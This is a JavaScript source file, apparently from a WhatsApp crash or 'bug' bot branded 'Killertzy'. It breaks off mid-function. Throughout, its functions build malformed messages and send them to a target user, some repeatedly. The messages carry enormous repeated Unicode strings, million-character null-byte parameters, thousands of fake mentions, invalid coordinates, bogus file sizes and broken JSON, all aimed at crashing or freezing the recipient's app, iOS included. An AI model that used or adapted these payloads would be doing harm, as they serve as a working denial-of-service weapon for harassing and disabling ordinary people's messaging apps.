                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
 
 async function TrashLocaIos2(sock, target, Ptcp = true) {
  const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿";
  
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: "https://files.catbox.moe/dtv40r.png",
         name: "🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://Killertzy2-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + TrashIosx, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            Ptcp
                ? { messageId: msg.key.id, participant: { jid: target } }
                : { messageId: msg.key.id }
        );
      await sleep(5000)
  }

async function CarouselOtax(sock, target) {
    for (let i = 0; i < 5; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "KILLERTZY" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§OtaxUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    // Pengiriman dengan format yang diminta tanpa mention
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

//VISIBLE
async function flowres(target) {
for (let i = 0; i < 5; i++) {
await sock.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "@Killertzy2 • #fvcker 🩸",
format: "DEFAULT"
},
nativeFlowResponseMessage: {
name: "address_message",
paramsJson: "\x10".repeat(1000000),
version: 3
}
}
}
}
}, { participant: { jid: target } })
}
}

//INVISIBLE
async function flowresInvisible(sock, target, Ptcp = true) {
    for (let i = 0; i < 1; i++) {

        let JsonExp = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " X ",
                                mentionedJid: Array.from(
                                    { length: 500 },
                                    (_, y) => `6285798929${y + 1}@s.whatsapp.net`
                                ),
                                isForwarded: true,
                                fromMe: false,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                  newsletterJid: "120363422445860082@newsletter",
                                  serverMessageId: 1,
                                  newsletterName: "┃► #Killertzy - Explore# 🩸"
                                },
                            },
                            body: {
                                text: "┃► #Killertzy - Explore# 🩸",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: JsonExp.message
                }
            },
            Ptcp
                ? { messageId: JsonExp.key.id, participant: { jid: target } }
                : { messageId: JsonExp.key.id }
        );
    }

    await new Promise(resolve => setTimeout(resolve, 5000));
}

async function InVisibleF(sock, target) {
        const media = await prepareWAMessageMedia(
            { video: { url: "https://a.top4top.io/m_35876zs7a1.mp4" } },
            { upload: sock.waUploadToServer }
        );
        
        const embeddedMusic = {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            author: "🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝" + "ោ៝".repeat(10000),
            title: ">! exec !<",
            artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
            artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
            artistAttribution: "https://www.instagram.com/_u/J.oxyy",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        };

        const msg = {
            key: {
                id: sock.generateMessageTag(),
                remoteJid: target,
                fromMe: true
            },
            message: {
                viewOnceMessage: {
                    message: {
                        videoMessage: {
                            ...media.videoMessage,
                            caption: "┃► #Killertzy - Explore# 🩸" + "ោ៝".repeat(1000),
                            contextInfo: {
                                forwardingScore: 9999,
                                isForwarded: true,
                                mentionedJid: [
                                "969696969696@s.whatsapp.net", 
                                ...Array.from({ length: 2000 }, () => 
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net" ),
                                ],
                                stanzaId: sock.generateMessageTag(),
                                participant: "0@s.whatsapp.net",
                                remoteJid: target,
                                isSampled: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "969@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "UPDATE"
                                },
                                businessMessageForwardInfo: {
                                    businessOwnerJid: "0@s.whatsapp.net"
                                },
                                smbClientCampaignId: "smb_client_campaign_id_example",
                                smbServerCampaignId: "smb_server_campaign_id_example",
                                dataSharingContext: { 
                                    showMmDisclosure: true 
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "Meta AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot Ai"
                                }
                            },
                            annotations: [
                                {
                                    embeddedContent: { embeddedMusic },
                                    embeddedAction: true
                                }
                            ]
                        }
                    }
                }
            }
        };

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "false" },
                    content: []
                }
            ]
        });

        console.log(chalk.green("┃► #Killertzy - Explore# 🩸"));
        await new Promise(resolve => setTimeout(resolve, 2500));
}

async function vom2GlxGs(sock, target, pc = true) {
  for (let z = 0; z < 5; z++) {
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: " Ola, idiota sinkoza ┃► #Killertzy - Explore# 🩸 impossible ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\": \"3\"}`,
              version: 3
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      pc
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}

async function gsGlx(sock, target) {
  for(let z = 0; z < 2; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "┃► #Killertzy - Explore# 🩸",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}

async function stcPckx(sock, target) {  
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "ꦾ".repeat(50000),
          publisher: "ꦾ".repeat(50000),
          caption: " 🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝. ",
          stickers: [
            ...Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🦠", "🩸"],
              accessibilityLabel: "",
              stickerSentTs: "PnX-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }))
          ],
          fileLength: "1073741824000",
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
          contextInfo: {
            remoteJid: "X",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9999999) +
                  "@s.whatsapp.net"
              ),
            ],
          },
          packDescription: "",
          mediaKeyTimestamp: "1747502082",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "999999999",
          stickerPackOrigin: "USER_CREATED",
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, msg.message, {
    participant: { 
      jid: target 
    }, 
    messageId: msg.key.id, 
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "3",
              name: "galaxy_message"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  })
}

async function gsLocXtendiOS(sock, target, pc = true) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(55555); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./killer.Tzy. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./Killer.Tzy. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let raldz = 0; raldz < 2; raldz++) {
      for (const item of [msg, msgx]) {
        await sock.relayMessage(
          target,
          {
            groupStatusMessageV2: {
              message: item.message
            }
          },
          pc
            ? { messageId: item.key.id, participant: { jid: target } }
            : { messageId: item.key.id }
        );
        console.log("Succes Send gs-ios");
      }
    }
   } catch (err) {
      console.error(err);
   }
};

async function glxFrc(sock, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: " @Killertzy2 • #fvcker 🩸 ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          }
        }
      },
      {}
    );
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (e) {
    console.error("error:", e);
  }
}

async function gsGlx2StcPck(sock, target) {
  const mentionedList = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1999 }, () =>
      `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
    )
  ];

  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " @Killertzy2 • #fvcker 🩸 ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u9999".repeat(90000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: mentionedList,
          }
        }
      }
    }
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: " 🧪⃟꙰。⌁𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲- 𝐄𝐱𝐩𝐨𝐬𝐞𝐝 ",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u9999".repeat(90000)}\",\"flow_message_version\":\"3\"}`,
        version: 3
      }
    }
  }, {});

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
